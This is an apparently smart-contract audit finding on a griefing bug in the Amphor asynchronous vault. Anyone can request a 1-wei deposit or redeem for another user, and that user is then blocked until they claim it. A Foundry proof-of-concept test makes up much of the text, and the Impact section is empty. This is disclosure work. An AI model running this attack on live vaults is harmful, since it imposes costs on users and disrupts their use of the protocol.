# Griefer can force users to spend extra gas to request a redeem or deposit

## Summary
A griefer can request to redeem or deposit 1 wei on behalf of another user in order to force them to spend gas to submit a legitimate request of redeem or deposit.

## Vulnerability Detail
When a vault is closed the protocol allows anybody to [request a redeem](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L477) of shares or [request a deposit](https://github.com/sherlock-audit/2024-03-amphor/blob/main/asynchronous-vault/src/AsyncSynthVault.sol#L439) of assets on behalf of another user. At epoch change, when a vault is settled, an user with a pending redeem request or a pending deposit request cannot request another redeem or deposit until the previous one is claimed.

A griefer can take advantage of this by requesting deposits or redeems of 1 wei or 1 share on behalf of another user, which will be forced to claim it and spending gas in order to be able to submit a legitimate request of deposit or redeem.

### POC
To copy-paste in `TestClaimRedeem.t.sol`:
```solidity
function test_requestDepositGriefingAttack() external {
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");
    address vaultOwner = vaultTested.owner();
    IERC20 asset = IERC20(vaultTested.asset());
    deal(address(asset), alice, 15e18);
    deal(address(asset), attacker, 1);

    vm.prank(alice);
    asset.approve(address(vaultTested), type(uint256).max);

    vm.prank(attacker);
    asset.approve(address(vaultTested), type(uint256).max);

    //-> Alice deposits and gets 10e18 shares
    vm.prank(alice);
    vaultTested.deposit(10e18, alice);

    //-> Vault gets closed
    vm.prank(vaultOwner);
    vaultTested.close();

    //-> Attacker requests a deposit of 1 asset with Alice as receiver
    vm.startPrank(attacker);
    vaultTested.requestDeposit(1, alice, attacker, "");
    vm.stopPrank();

    //-> Vault is settled
    vm.startPrank(vaultOwner);
    asset.approve(address(vaultTested), type(uint256).max);
    vaultTested.settle(10e18);
    vm.stopPrank();

    //-> Alice can't request a deposit until the previous one is claimed
    vm.prank(alice);
    vaultTested.requestDeposit(5e18, alice, alice, "");//‚ùå Reverts
}
```
## Impact
